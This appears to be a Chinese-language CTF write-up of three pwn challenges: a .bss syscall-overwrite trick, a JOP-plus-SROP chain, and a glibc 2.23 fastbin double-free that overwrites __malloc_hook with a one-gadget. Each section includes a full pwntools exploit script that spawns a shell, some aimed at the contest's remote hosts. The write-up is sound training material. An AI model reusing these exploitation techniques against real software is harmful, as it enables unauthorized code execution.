![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918558.png)

异常处理函数本来是write异常然后exit退出

但是write的调用怎么把调用号到参数都放在bss上,而且我们一开始可以向bss写入数据,那是不是我们可以覆盖fd,buf,count和系统调用号使之执行execv("/bin/sh",0,0)?

是的

```python
from pwn import *
#io=process('./pwn')
io=remote("node1.tgctf.woooo.tech",32136)
context.arch='amd64'
def bug():
    gdb.attach(io)
leave=0x40122B
payload=b'/bin/sh\x00'.ljust(0x40,b'\x00')+p64(0x3b)+p64(0x404108)+p64(0)*2
io.sendafter(b"welcome! could you tell me your name?\n",payload)
io.recvuntil(b'what dou you want to say?\n')
bss=0x404800
payload=b'a'*0x40+p64(bss)+p64(leave)
io.send(payload)
io.interactive()
```

用一次栈溢出触发就可以了:)



## NORET | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918559.png)

其实是个菜单题啦,菜单的符号全都写在data段看的不是很清楚,其中存在sys\_read可以溢出,但这道题:没有ret!!!!!!!

所以这道题要写的不是rop链而是jop链:用jmp将代码段相连接

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918560.png)

在text段存在丰富的gadget,但问题是jmp相关代码都是jmp \[rgs],这也就要求我们要知道存放jop的地址(栈)

所以第一步是泄露栈地址:

我们根本没得选,只能用write,那就要将rsi设置为栈上的地址

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918561.png)

刚刚好存在这样的gadget,而且泄露完还能返回程序的正常流程,相当于0副作用,免费送了我们一次leak\_stack的机会

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918562.png)

溢出部分的代码段这个样子,其中对于rsi的设置靠前,我的想法是将栈先迁移到bss上,然后再jop(其实也可以不用迁移)

迁移后,我们可以先向bss上写入/bin/sh这样的字符串,然后开始考虑布置新的jop链

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918563.png)

似乎是一团乱麻,想找出一个execv("/bin/sh"0,0)的正确顺序实在不容易

我在这里观察了好久,最后不想看了,想到了srop,在srop里我可以轻松布置各个寄存器的值,不用写奇奇怪怪的jop链了,而且srop只需要我们设置rax=0xf,rip=syscall

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918564.png)



这就很好办了,我们只需要将这两个gadget连在一起就可以了,至于设置寄存器都是sigreturnframe的事情了

```python
from pwn import *
io=process('./pwn')
#io=remote("node1.tgctf.woooo.tech",30847)
context.arch='amd64'
def bug():
    gdb.attach(io)
def c(Id):
    io.sendlineafter(b'> ',str(Id).encode())
def s(payload):
    io.sendafter(b": ",payload)
bss=0x402800
pop_4_jmp=0x40100F 
push_3=0x40108A 
payload=b'\x00'*0x100+p64(push_3)
c(2)
s(payload)
io.recvuntil(b'Thank you for your feedback!\n')
stack=u64(io.recv(6).ljust(8,b'\x00'))
success("stack=>"+str(hex(stack)))
start=stack-0x100
c(2)
payload=p64(start+0x18-1)+p64(start+0x20)+p64(start+0x28)+p64(0x40101B)+p64(0)+p64(0x4010D5)+p64(bss-8)
payload=payload.ljust(0x100,b'\x00')+p64(pop_4_jmp)+p64(start)+p64(0)+p64(pop_4_jmp)+p64(bss)
s(payload)
io.recvuntil(b'Thank you for your feedback!')
payload =b'/bin/sh\x00'
#======================================================================================
#bss:
f=SigreturnFrame()
f.rax=0x3b
f.rdi=bss-8
f.rsi=0
f.rdx=0
f.rip=0x401163
payload+=p64(bss+0x110-1)+p64(bss+0x118)+p64(0xFFFFFFFFFFFFFFF2)
payload+=bytes(f)
payload =payload.ljust(0x108,b'\x00') 
payload+=p64(0x401024)+p64(0x401163)
io.send(payload)
io.interactive()
```

## Heap |FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918565.png)

菜单题,其中delet存在uaf漏洞,结合这道题是2.23版本的,我们可以fastbins\_attack

但是这道题没有show选项,这就导致leak\_libc成为了难题

我们唯一可以获得回显的地方是在rename处,name是个存在于bss上的变量,我们可以读写上面的数据,而且name的长度足足有0xd0!

那我们能不能先fastbins\_attack将name申请出来,然后rename修改name的chunk大小,再free(name),这样main\_arena就会被挂到name上,此时我们就可以获得libc\_base的回显了

然后就是最简单的攻击\_\_malloc\_hook,写为ogg,用malloc触发就可以了

```python
from pwn import *
#io=process('./pwn')
io=remote("node1.tgctf.woooo.tech",30177)
libc=ELF('./libc.so.6')
Name=0x6020C0
#context.log_level='debug'
def add(size,payload=b'01'):
    io.sendlineafter(b"> ",b"1")
    io.sendlineafter(b"> ",str(size).encode())
    io.sendafter(b"> ",payload)
def free(Id):
    io.sendlineafter(b"> ",b"2")
    io.sendlineafter(b"> ",str(Id).encode())
def name(payload):
    io.sendlineafter(b"> ",b"3")
    io.sendafter(b"> ",payload)
def bug():
    gdb.attach(io)
io.sendafter(b"> ",b"01")
#=====================================================================
add(0x60,b'01')#0
add(0x60,b'01')#1
payload=p64(0)+p64(0x71)
name(payload)
free(0)
free(1)
free(0)
add(0x60,p64(Name))
add(0x60)#2
add(0x60)#3
add(0x60)#4
#=====================================================================
payload =p64(0)+p64(0x91)
payload =payload.ljust(0x90,b'\x00')
payload+=p64(0)+p64(0x21)+p64(0)*2
payload+=p64(0)+p64(0x21)
name(payload)
free(5)
name(b'a'*0x10)
io.recvuntil(b'a'*0x10)
base=u64(io.recv(6).ljust(8,b'\x00'))-0x3c4b78
success("base=>"+str(hex(base)))
mhook=base+libc.sym['__malloc_hook']
realloc=base+libc.sym['realloc']
one=[0x4527a,0xf03a4,0xf1247][0]+base
free(0)
free(1)
free(0)
add(0x60,p64(mhook-0x23))
add(0x60)
add(0x60)
payload=b'\x00'*(0x13-8)+p64(one)+p64(realloc+8)
add(0x60,payload)
io.sendlineafter(b"> ",b"1")
io.sendlineafter(b"> ",str(0x60).encode())
io.interactive()
```











